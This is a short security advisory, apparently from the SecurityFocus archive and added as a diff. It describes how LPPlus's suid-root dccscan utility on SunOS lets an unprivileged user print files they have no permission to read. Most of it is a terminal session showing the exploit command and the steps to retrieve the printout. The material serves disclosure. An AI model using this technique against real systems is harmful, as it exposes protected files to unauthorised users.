@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/1644/info
+
+$LPHOME/bin/dccscan is suid-root and can be executed by any user. It is possible for an unprivileged user to print files to which he does not have read access. In testing, this works even for printers to which the user is is not given any access in the LPPlus security configuration.
+
+# id
+uid=0(root) gid=1(other)
+# ls -alt /root/test
+total 6
+drwx------ 2 root other 512 Sep 5 17:46 .
+-r-------- 1 root other 365 Sep 5 17:46 foo
+drwx------ 3 root other 512 Sep 5 17:46 ..
+# su - test
+Sun Microsystems Inc. SunOS 5.6 Generic August 1997
+$ id
+uid=600(test) gid=300(users)
+$ ls -alt /root/test
+/root/test: Permission denied
+$ dccscan /root/test 30 5 "-dlp0"
+$
+
+# now, go to the printer and wait for the files to come out, or watch them 
+# being queued as root, if you have access to dccstat
